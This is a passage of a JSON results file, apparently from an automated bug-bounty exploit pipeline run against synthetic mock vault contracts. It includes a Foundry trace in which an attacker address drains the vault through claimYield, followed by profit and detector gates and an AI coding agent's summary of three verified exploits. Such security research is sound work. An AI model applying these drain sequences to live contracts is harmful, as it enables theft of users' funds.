\u251c\u2500 [31941] MultiBugVault::deposit(1000000000000000000 [1e18])\n    \u2502   \u251c\u2500 [5195] MockToken::transferFrom(0x00000000000000000000000000000000000A11cE, MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1000000000000000000 [1e18])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u251c\u2500 [824] MockToken::balanceOf(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] 101000000000000000000 [1.01e20]\n    \u2502   \u2514\u2500 \u2190 [Return] 1000000000000000000 [1e18]\n    \u251c\u2500 [0] VM::stopPrank()\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [24750] MultiBugVault::setYield(1000000000 [1e9])\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [0] VM::warp(1)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [0] VM::prank(0x00000000000000000000000000000000000A11cE)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [22542] MultiBugVault::claimYield()\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [0] VM::warp(102)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [0] VM::prank(0x00000000000000000000000000000000000A11cE)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [4513] MultiBugVault::claimYield()\n    \u2502   \u251c\u2500 [1880] MockToken::transfer(0x00000000000000000000000000000000000A11cE, 101000000000000000000 [1.01e20])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [824] MockToken::balanceOf(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 0\n    \u251c\u2500 [824] MockToken::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 101000000000000000000 [1.01e20]\n    \u251c\u2500 emit InvariantEvidence(classInvariant: \"attacker_token_increased\", subject: 0x00000000000000000000000000000000000A11cE, asset: MockToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], beforeValue: 1000000000000000000 [1e18], afterValue: 101000000000000000000 [1.01e20], delta: 100000000000000000000 [1e20], threshold: 99000000000000000000 [9.9e19])\n    \u2514\u2500 \u2190 [Stop]\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.21ms (486.46\u00b5s CPU time)\n\nRan 1 test suite in 21.22ms (1.21ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n\n"
+        },
+        {
+          "gate": "semantic",
+          "passed": true,
+          "detail": "",
+          "artifact": ""
+        },
+        {
+          "gate": "state_delta",
+          "passed": true,
+          "detail": "attacker_token_increased delta=100000000000000000000",
+          "artifact": "{\"class_invariant\": \"attacker_token_increased\", \"subject\": \"0x00000000000000000000000000000000000A11cE\", \"asset\": \"0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f\", \"before\": 1000000000000000000, \"after\": 101000000000000000000, \"delta\": 100000000000000000000, \"threshold\": 99000000000000000000}"
+        },
+        {
+          "gate": "econ",
+          "passed": true,
+          "detail": "raw_delta=100000000000000000000 >= min_profit_raw=99000000000000000000; gas-vs-profit skipped because profit_token_price_wei is missing",
+          "artifact": ""
+        },
+        {
+          "gate": "dup",
+          "passed": true,
+          "detail": "warning: matched detectors [{'check': 'unchecked-transfer', 'impact': 'High', 'lines': '84-104'}, {'check': 'incorrect-equality', 'impact': 'Medium', 'lines': '84-104'}, {'check': 'timestamp', 'impact': 'Low', 'lines': '84-104'}] (not hard-failed outside immunefi_bounty)",
+          "artifact": ""
+        },
+        {
+          "gate": "halmos",
+          "passed": true,
+          "detail": "not requested",
+          "artifact": ""
+        }
+      ],
+      "forge_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "exit_code": 0,
+      "hypothesis_path": "/home/sane100400/projects/bounty/poc-forge/.harness_runs/H1_codex_harness/synthetic_poc_forge/synthetic_poc_forge-3.json",
+      "elapsed_sec": 2.295
+    }
+  ],
+  "cost_usd": null,
+  "elapsed_sec": 228.796,
+  "exit_code": 0,
+  "codex_last_message": "Verified 3 findings and wrote the required hypothesis JSON + isolated PoC files:\n\n- `synthetic_poc_forge-1`: `SyntheticVault.deposit(uint256)` donation share inflation, delta `49.999999999999999999` MockToken.\n- `synthetic_poc_forge-2`: `MultiBugVault.deposit(uint256)` zero-share donation drain, delta `100` MockToken.\n- `synthetic_poc_forge-3`: `MultiBugVault.claimYield()` pooled-principal yield drain, delta `100` MockToken.\n\nAll three passed `verify.py` with exit code `0`. The final `last_verify.json` currently contains the successful evidence for `synthetic_poc_forge-3`, since the verifier overwrites that file on each run.",
+  "codex_stderr_tail": ""
+}
